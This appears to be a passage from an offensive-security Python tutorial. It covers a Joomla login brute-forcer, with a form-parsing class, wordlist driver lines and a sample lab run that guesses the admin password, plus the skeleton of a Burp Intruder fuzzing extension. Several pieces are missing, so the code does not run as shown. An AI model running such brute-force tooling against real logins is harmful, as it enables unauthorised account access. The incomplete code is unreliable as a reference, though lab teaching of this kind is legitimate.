### Code Optimization and Documentation

#### 1. Brute-Force Class Overview
This is the primary brute-forcing class, responsible for handling all HTTP requests and managing cookies. After obtaining a password attempt, we set up a cookie jar using the `FileCookieJar` class to store cookies in a file. We then initialize our `urllib2` opener, passing in the initialized cookie jar, which ensures that any cookies are handled appropriately. The initial request retrieves the login form, and the raw HTML is passed to an HTML parser. The parser returns a dictionary of all form elements. The username and password fields are replaced with the brute-force attempt, and the POST variables are URL-encoded before being sent in the subsequent HTTP request. Finally, the script checks if the authentication was successful.

#### 2. HTML Parsing Class
The `BruteParser` class extends the `HTMLParser` class and is used to parse the HTML form elements. It stores the results in a dictionary and processes input tags to extract name and value attributes.

```python
import urllib2
from cookielib import FileCookieJar
from HTMLParser import HTMLParser

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value
```

#### 3. Using the HTMLParser Class
The `HTMLParser` class has three main methods: `handle_starttag`, `handle_endtag`, and `handle_data`. These methods are called when the parser encounters an opening tag, closing tag, or raw text, respectively.

```python
def handle_starttag(self, tag, attributes):
    pass

def handle_endtag(self, tag):
    pass

def handle_data(self, data):
    pass
```

Example usage:
```python
parser = BruteParser()
html_content = "<title>Python rocks!</title>"
parser.feed(html_content)
print(parser.tag_results)
```

#### 4. Joomla Brute-Forcer
To complete the Joomla brute-forcer, we need to add the `build_wordlist` function and the following code:

```python
# paste the build_wordlist function here
words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
```

#### 5. Testing the Script
Ensure Joomla is installed on your Kali VM. The target VM is at `192.168.112.131`, and the wordlist is provided by Cain and Abel. The username is set to `admin`, and the password is `justin`.

```sh
$ python2.7 joomla_killer.py
Finished setting up for: admin
Trying: admin : 0racl38 (306697 left)
Trying: admin : !@#$% (306697 left)
--snip--
Trying: admin : justin (306655 left)
[*] Bruteforce successful.
[*] Username: admin
[*] Password: justin
[*] Waiting for other threads to exit...
```

#### 6. Extending Burp Proxy
Burp Suite can be extended using Python, Ruby, or Java. We will create two extensions: one for fuzzing HTTP requests and another for discovering virtual hosts and subdomains.

##### Setting Up
1. Download Burp from [PortSwigger](http://www.portswigger.net/).
2. Install Jython (a Python implementation written in Java) and save the JAR file to an easy-to-remember location.
3. Run Burp and configure it to use the Jython interpreter.

```sh
java -XX:MaxPermSize=1G -jar burpsuite_pro_v1.6.jar
```

##### Creating the Fuzzer Extension
We will create a simple fuzzer extension for Burp Intruder.

```python
from burp import IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
from java.util import List, ArrayList
import random

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.registerIntruderPayloadGeneratorFactory(self)

    def getGeneratorName(self):
        return "BHP Payload Generator"

    def createNewInstance(self, attack):
        return BHPFuzzer(self, attack)

class BHPFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._attack = attack
        self._payloads = []
        self._num_payloads = 0
        self._payload_index = 0

    def hasMorePayloads(self):
        return self._payload_index < self._num_payloads

    def getNextPayload(self, baseValue):
        payload = self._payloads[self._payload_index]
        self._payload_index += 1
        return payload

    def reset(self):
        self._payload_index = 0
```

This setup provides a clear and professional structure for the brute-forcing and Burp extension scripts.